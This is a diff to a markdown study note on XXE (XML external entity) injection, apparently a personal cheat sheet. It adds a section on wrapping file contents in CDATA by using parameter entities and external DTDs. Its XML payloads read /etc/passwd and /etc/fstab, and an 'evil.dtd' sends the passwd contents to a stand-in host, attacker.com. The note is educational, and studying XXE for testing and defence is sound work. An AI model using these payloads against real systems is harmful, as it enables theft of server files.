@@ -83,6 +83,8 @@ There are different types of XXE's; inband, error, out-of-band (OOB)
 * error - a blink XXE, where you basically see a bunch of errors
 * OOB - xml is parsed, but you can't see the output
 
+## External Document Type Definitions
+
 ``` xml
 <!-- main.xml -->
 <?xml version="1.0"?>
@@ -90,7 +92,7 @@ There are different types of XXE's; inband, error, out-of-band (OOB)
 <data>&send;</data>
 ```
 
-``` dtd
+``` xml
 <!-- evil.dtd -->
 <!ENTITY % passwd SYSTEM "file:///etc/passwd">
 <!ENTITY % wrapper "<!ENTITY send SYSTEM 'http://attacker.com/?%passwd;'>">
@@ -102,3 +104,30 @@ There are different types of XXE's; inband, error, out-of-band (OOB)
 <!ENTITY send SYSTEM 'http://attacker.com/?CONTENTS_OF_PASSWD>
 -->
 ```
+
+If a file contains non "well-formed" tags, e.g. `<p></p>`, they need to be enclosed with CDATA. Whatever is in between the opening and closing CDATA is will not be parsed as markup by the XML parser. e.g `<text>` is ignored in `<![CDATA[ <text> ]]>`.
+
+The value of a CDATA entity has to be well-formed so we cannot do the following
+
+``` xml
+<?xml version="1.0"?>
+<!DOCTYPE data [
+<!ENTITY start "<![CDATA[">
+<!ENTITY file SYSTEM "file:///etc/fstab">
+<!ENTITY end "]]">
+]>
+<data>&start;&file;&end;</data>
+```
+
+The solution to this is using parameter entities and external DTDs
+
+``` xml
+<!-- external.dtd -->
+<!ENTITY % start "<![CDATA[">
+<!ENTITY % file SYSTEM "file:///etc/fstab">
+<!ENTITY % end "]]">
+<!ENTITY % wrapper "<!ENTITY all '%start;%file;%end;'>"
+%wrapper;
+```
+
+For more possible XXE payloads see [here](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/XXE%20Injection)
